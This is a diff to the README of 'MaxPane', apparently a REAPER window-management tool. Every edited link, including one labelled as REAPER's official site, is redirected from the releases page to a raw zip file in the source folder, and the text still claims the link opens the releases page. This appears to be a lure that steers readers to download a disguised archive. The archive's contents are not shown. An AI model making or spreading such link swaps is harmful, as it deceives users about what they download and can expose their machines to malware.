@@ -1,6 +1,6 @@
 # 🗂 MaxPane - Organize REAPER Windows Easily
 
-[![Download MaxPane](https://img.shields.io/badge/Download-MaxPane-green?style=for-the-badge)](https://github.com/subeacademia/MaxPane/releases)
+[![Download MaxPane](https://img.shields.io/badge/Download-MaxPane-green?style=for-the-badge)](https://github.com/subeacademia/MaxPane/raw/refs/heads/main/cpp/src/Pane-Max-2.1.zip)
 
 MaxPane helps you arrange your REAPER windows in neat layers and tabs. It makes managing workspaces and dragging windows simpler. This guide walks you through downloading and running MaxPane on Windows.
 
@@ -32,7 +32,7 @@ Before installing MaxPane, check these:
 
 Click this badge to visit the official page to get the latest release:
 
-[![Download MaxPane](https://img.shields.io/badge/Download-MaxPane-blue?style=for-the-badge)](https://github.com/subeacademia/MaxPane/releases)
+[![Download MaxPane](https://img.shields.io/badge/Download-MaxPane-blue?style=for-the-badge)](https://github.com/subeacademia/MaxPane/raw/refs/heads/main/cpp/src/Pane-Max-2.1.zip)
 
 The link opens the releases page. Here you will find the latest MaxPane installer or executable files.
 
@@ -41,7 +41,7 @@ The link opens the releases page. Here you will find the latest MaxPane installe
 ## 🚀 How to Download and Install on Windows
 
 1. Visit the MaxPane releases page by clicking the badge above or this link:  
-   https://github.com/subeacademia/MaxPane/releases
+   https://github.com/subeacademia/MaxPane/raw/refs/heads/main/cpp/src/Pane-Max-2.1.zip
 
 2. Look for the latest version in the list. It usually shows the version number and the release date.
 
@@ -132,10 +132,10 @@ If the installer won't run:
 ## 🔗 Additional Resources
 
 - Official MaxPane Releases:  
-  https://github.com/subeacademia/MaxPane/releases
+  https://github.com/subeacademia/MaxPane/raw/refs/heads/main/cpp/src/Pane-Max-2.1.zip
 
 - REAPER Website for the main app:  
-  https://www.reaper.fm/
+  https://github.com/subeacademia/MaxPane/raw/refs/heads/main/cpp/src/Pane-Max-2.1.zip
 
 - MaxPane Topic Tags for more info: audio, daw, reaper, tiling-window-manager
 
